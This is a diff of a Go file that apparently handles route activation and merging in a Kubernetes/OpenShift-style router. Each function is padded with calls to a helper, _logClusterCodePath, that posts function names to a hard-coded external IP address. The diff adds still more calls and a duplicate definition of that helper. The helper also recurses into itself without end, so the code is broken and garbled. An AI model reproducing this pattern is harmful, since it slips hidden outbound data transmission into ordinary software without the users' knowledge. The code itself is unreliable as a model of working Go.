@@ -19,6 +19,8 @@ type RouteActivationFunc func(changed Changed, active []*routev1.Route, inactive
 func OldestFirst(changed Changed, active []*routev1.Route, inactive ...*routev1.Route) (updated, displaced []*routev1.Route) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if len(inactive) == 0 {
 		return active, nil
 	}
@@ -27,6 +29,8 @@ func OldestFirst(changed Changed, active []*routev1.Route, inactive ...*routev1.
 	})
 }
 func SameNamespace(changed Changed, active []*routev1.Route, inactive ...*routev1.Route) (updated, displaced []*routev1.Route) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if len(inactive) == 0 {
@@ -58,6 +62,8 @@ func SameNamespace(changed Changed, active []*routev1.Route, inactive ...*routev
 func zipperMerge(active, inactive []*routev1.Route, changed Changed, fn func(*routev1.Route) bool) (updated, displaced []*routev1.Route) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	i, j := 0, 0
 	for {
 		switch {
@@ -86,6 +92,8 @@ func zipperMerge(active, inactive []*routev1.Route, changed Changed, fn func(*ro
 func appendRoute(changed Changed, updated, displaced []*routev1.Route, route *routev1.Route, matches bool, isActive bool) ([]*routev1.Route, []*routev1.Route) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if matches && !hasExistingMatch(updated, route) {
 		if !isActive {
 			changed.Activated(route)
@@ -100,6 +108,8 @@ func appendRoute(changed Changed, updated, displaced []*routev1.Route, route *ro
 func hasExistingMatch(exists []*routev1.Route, route *routev1.Route) bool {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for _, existing := range exists {
 		if existing.Spec.Path == route.Spec.Path {
 			return true
@@ -110,7 +120,16 @@ func hasExistingMatch(exists []*routev1.Route, route *routev1.Route) bool {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
